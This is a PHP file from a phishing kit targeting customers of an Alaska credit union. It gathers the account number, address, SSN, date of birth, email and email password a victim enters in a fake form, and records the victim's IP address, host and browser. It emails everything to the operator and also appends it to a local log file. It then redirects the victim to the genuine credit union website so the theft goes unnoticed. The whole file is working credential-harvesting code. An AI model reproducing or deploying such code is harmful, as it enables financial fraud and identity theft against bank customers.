<?php

session_start();
include ('./bug.php');
$accn = $_POST['AcctNum'];
$addr = $_POST['lastADD'];
$zips = $_POST['suffix'];
$xssn = $_POST['ssn'];
$xdob = $_POST['dateOfBirth'];
$xemail = $_POST['email'];
$xemPass = $_POST['confirmEmail'];
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
	
	
	
	$message .= "|------------| -ALaskFCU- |--------------|\n";
	$message .= "    -----------o0o^v^o0o---------     \n";
	$message .= "|Account no: ".$accn."\n";
	$message .= "|Address: ".$addr."\n";
	$message .= "|ZIP: ".$zips."\n";
	$message .= "|SSN: ".$xssn."\n";
	$message .= "|DOB: ".$xdob."\n";
	$message .= "|Email: ".$xemail."\n";
	$message .= "|EmailPassword: ".$xemPass."\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|--------- I N F O X I P ---------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|         --- Host Details ----       \n";
	$message .= "|Client Host : ".$hostname."\n";
	$message .= "|User Agent : ".$useragent."\n";
	$message .= "|----------- Forged By d3ng3 --------------|\n";
	$send = $set;
	$subject = "ALaska Details: $accn";
    mail($send, $subject, $message);   

    $tds = fopen("AL2.txt","a");
 fputs($tds,$message);
 fclose($tds);
  header("Location: https://www.alaskausa.org/current/rates/consumerloanrates.asp#Other_Secured");


?>